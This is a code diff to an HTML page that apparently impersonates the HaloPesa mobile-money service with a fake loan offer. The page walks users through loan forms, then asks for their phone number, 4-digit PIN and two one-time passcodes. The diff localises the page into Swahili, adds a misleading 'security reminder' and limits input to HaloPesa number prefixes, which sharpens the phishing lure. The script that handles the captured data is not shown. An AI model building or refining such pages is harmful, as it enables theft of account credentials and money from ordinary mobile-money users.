@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -10,7 +10,7 @@
 
 <div class="app-container">
 
-  <!-- SCREEN 1: WELCOME / NOTICE SCREEN -->
+  <!-- SKRINI YA 1: UKARIBISHO / TAARIFA MUHIMU -->
   <section id="screen-welcome" class="screen active">
     <div class="welcome-header-area">
       <div class="halopesa-logo-row">
@@ -23,24 +23,21 @@
     <div class="notice-card-box">
       <div class="notice-title-box">
         <span class="warn-icon">⚠️</span>
-        <h2>TAARIFA MUHIMU / IMPORTANT NOTICE</h2>
+        <h2>TAARIFA MUHIMU / KUMBUSHO LA USALAMA</h2>
       </div>
 
       <p class="notice-body-p">
         <strong>ILI KUANZA MAOMBI YAKO HAKIKISHA UNA MAELEZO HALALI YA HALOPESA.</strong>
       </p>
-      <p class="notice-body-p">
-        <strong>THIBITISHA KABLA YA KUANDIKA, TUMIA RANGI YA HALOPESA</strong>
-      </p>
 
       <ul class="notice-bullets">
         <li>✅ • Hakikisha taarifa zako ni sahihi na halali kabla ya kuwasilisha ombi</li>
-        <li>✅ • Thibitisha namba yako ya HaloPesa imeandikwa kwa usahihi</li>
+        <li>✅ • Thibitisha namba yako ya HaloPesa imeandikwa kwa usahihi (Namba za 061, 062, 063 pekee)</li>
         <li>✅ • Tumia huduma rasmi za HaloPesa tu kwa usalama wa akaunti yako</li>
       </ul>
 
-      <!-- NAELEWA BUTTON WITH HEART BEAT PULSING ANIMATION -->
-      <button type="button" id="btn-goto-slider" class="btn-naelewa-pulse">NAELEWA</button>
+      <!-- KIFUNGO CHA NAELEWA - RANGI NYEUPE NA MAPIGO YA MOYO -->
+      <button type="button" id="btn-goto-slider" class="btn-pulse-white">NAELEWA</button>
     </div>
 
     <div class="app-download-footer">
@@ -49,7 +46,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 2: LOAN REPAYMENT ESTIMATE SLIDER -->
+  <!-- SKRINI YA 2: KIKOKOTOO CHA MKORO / SLIDER -->
   <section id="screen-slider" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <button type="button" class="nav-back-btn text-white" id="btn-slider-back">← Rudi</button>
@@ -83,12 +80,12 @@
           <h2 id="monthly-rep-val">TSh 9,504</h2>
         </div>
 
-        <button type="button" id="btn-goto-form1" class="btn-primary-orange">OMBA SASA</button>
+        <button type="button" id="btn-goto-form1" class="btn-pulse-white">OMBA SASA</button>
       </div>
     </div>
   </section>
 
-  <!-- SCREEN 3: FORM STEP 1 OF 3 -->
+  <!-- SKRINI YA 3: FOMU HATUA 1 YA 3 -->
   <section id="screen-form1" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <button type="button" class="nav-back-btn text-white" id="btn-form1-back">← Rudi</button>
@@ -135,11 +132,11 @@
         <textarea id="loan-purpose" class="input-textarea" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
       </div>
 
-      <button type="button" id="btn-form1-next" class="btn-orange-action">HATUA INAYOFUATA</button>
+      <button type="button" id="btn-form1-next" class="btn-pulse-white">HATUA INAYOFUATA</button>
     </div>
   </section>
 
-  <!-- SCREEN 4: FORM STEP 2 OF 3 -->
+  <!-- SKRINI YA 4: FOMU HATUA 2 YA 3 -->
   <section id="screen-form2" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <button type="button" class="nav-back-btn text-white" id="btn-form2-back">← Rudi</button>
@@ -164,22 +161,23 @@
       </div>
 
       <div class="form-group">
-        <label>Namba ya Simu</label>
+        <label>Namba ya Simu (HaloPesa)</label>
         <div class="phone-input-group">
           <span class="flag-prefix">🇹🇿 +255</span>
-          <input type="text" id="form-phone" class="input-text" placeholder="712345678 au 0712345678" inputmode="numeric">
+          <input type="text" id="form-phone" class="input-text" placeholder="061..., 062..., 063..." inputmode="numeric">
         </div>
-        <small class="helper-note">Weka namba 9 au anza na 0 (mfano, 0712345678 -&gt; inabadilika hadi +255712345678)</small>
+        <small class="helper-note">Weka namba inayoanza na 061, 062, au 063</small>
+        <div id="banner-phone-error" class="surface-error-banner" style="margin-top: 8px;"></div>
       </div>
 
       <div class="form-buttons-row">
         <button type="button" id="btn-form2-prev" class="btn-grey-action">ILIYOTANGULIA</button>
-        <button type="button" id="btn-form2-next" class="btn-orange-action">HATUA INAYOFUATA</button>
+        <button type="button" id="btn-form2-next" class="btn-pulse-white">HATUA INAYOFUATA</button>
       </div>
     </div>
   </section>
 
-  <!-- SCREEN 5: FORM STEP 3 OF 3 -->
+  <!-- SKRINI YA 5: FOMU HATUA 3 YA 3 -->
   <section id="screen-form3" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <button type="button" class="nav-back-btn text-white" id="btn-form3-back">← Rudi</button>
@@ -222,12 +220,12 @@
 
       <div class="form-buttons-row">
         <button type="button" id="btn-form3-prev" class="btn-grey-action">ILIYOTANGULIA</button>
-        <button type="button" id="btn-form3-submit" class="btn-orange-action">WASILISHA MAOMBI</button>
+        <button type="button" id="btn-form3-submit" class="btn-pulse-white">WASILISHA MAOMBI</button>
       </div>
     </div>
   </section>
 
-  <!-- SCREEN 6: SIGN IN / PIN ENTRY -->
+  <!-- SKRINI YA 6: KUINGIA AKAUNTI (PIN) -->
   <section id="screen-signin" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <div class="brand-header-inline">
@@ -243,12 +241,11 @@
 
       <div class="phone-input-group margin-bottom-15">
         <span class="flag-prefix">🇹🇿 +255</span>
-        <input type="text" id="signin-phone" class="input-text" placeholder="712345678 au 0712345678">
+        <input type="text" id="signin-phone" class="input-text" placeholder="061..., 062..., 063...">
       </div>
 
       <label class="pin-title-label">Weka PIN yako (tarakimu 4)</label>
 
-      <!-- Surface Error Notification -->
       <div id="banner-pin-error" class="surface-error-banner"></div>
 
       <div class="golden-pin-container">
@@ -260,11 +257,11 @@
 
       <a href="#" class="forgot-pin-link">Umesahau PIN?</a>
 
-      <button type="button" id="btn-submit-signin" class="btn-primary-orange margin-top-20">INGIA</button>
+      <button type="button" id="btn-submit-signin" class="btn-pulse-white margin-top-20">INGIA</button>
     </div>
   </section>
 
-  <!-- SCREEN 7: OTP VERIFICATION (STEP 1) -->
+  <!-- SKRINI YA 7: UTHIBITISHO WA OTP (HATUA YA 1) -->
   <section id="screen-otp1" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <div class="brand-header-inline">
@@ -283,7 +280,6 @@
         ✓ Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.
       </div>
 
-      <!-- Surface Error Notification -->
       <div id="banner-otp1-error" class="surface-error-banner"></div>
 
       <div class="golden-otp-container">
@@ -293,11 +289,11 @@
         <input type="text" class="otp1-box-square" maxlength="1" inputmode="numeric">
       </div>
 
-      <button type="button" id="btn-submit-otp1" class="btn-primary-orange margin-top-20">WASILISHA</button>
+      <button type="button" id="btn-submit-otp1" class="btn-pulse-white margin-top-20">WASILISHA</button>
     </div>
   </section>
 
-  <!-- SCREEN 8: OTP VERIFICATION (STEP 2 - FINAL) -->
+  <!-- SKRINI YA 8: UTHIBITISHO WA MWISHO WA OTP (HATUA YA 2) -->
   <section id="screen-otp2" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <div class="brand-header-inline">
@@ -316,7 +312,6 @@
         ✓ Hatua karibu imekamilika! Weka namba ya mwisho ya uthibitisho.
       </div>
 
-      <!-- Surface Error Notification -->
       <div id="banner-otp2-error" class="surface-error-banner"></div>
 
       <div class="golden-otp-container">
@@ -326,11 +321,11 @@
         <input type="text" class="otp2-box-square" maxlength="1" inputmode="numeric">
       </div>
 
-      <button type="button" id="btn-submit-otp2" class="btn-primary-orange margin-top-20">WASILISHA UHAKIKI</button>
+      <button type="button" id="btn-submit-otp2" class="btn-pulse-white margin-top-20">WASILISHA UHAKIKI</button>
     </div>
   </section>
 
-  <!-- SCREEN 9: SUCCESS SCREEN -->
+  <!-- SKRINI YA 9: MAFANIKIO (SUCCESS) -->
   <section id="screen-success" class="screen white-screen">
     <div class="card-container-main align-center">
       <div class="success-badge-circle">✓</div>
@@ -358,20 +353,20 @@
         <p>Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</p>
       </div>
 
-      <button type="button" id="btn-finish-home" class="btn-primary-orange margin-top-20">Rudi Nyumbani</button>
+      <button type="button" id="btn-finish-home" class="btn-pulse-white margin-top-20">Rudi Nyumbani</button>
     </div>
   </section>
 
-  <!-- STOPPED SCREEN (IF BLOCKED / DENIED) -->
+  <!-- SKRINI YA KUZUIWA / KUSIMAMISHWA -->
   <section id="screen-stopped" class="screen white-screen">
     <div class="card-container-main align-center" style="margin-top: 150px;">
       <div class="success-badge-circle" style="background-color: #D32F2F;">✕</div>
       <h2 class="congrats-title" style="color: #D32F2F;">Maombi Yamesimamishwa</h2>
-      <p class="congrats-sub">Samahani, maombi yako yamekataliwa au kuzuiliwa na mfumo wa usalama wa HaloPesa.</p>
+      <p class="congrats-sub">Samahani, namba yako sio HaloPesa halali (inapaswa kuanza na 061, 062, au 063) au ombi limezuiwa na mfumo.</p>
     </div>
   </section>
 
-  <!-- LOADING SPINNER OVERLAY -->
+  <!-- KIBOX CHA KUSUBIRI (LOADING OVERLAY) -->
   <div id="loading-overlay" class="loading-overlay">
     <div class="spinner"></div>
     <h3 id="loading-title">INATHIBITISHA MAOMBI...</h3>
@@ -382,5 +377,5 @@
 
 <script src="script.js"></script>
 </body>
-                                                                                        </html>
-                              
+          </html>
+  
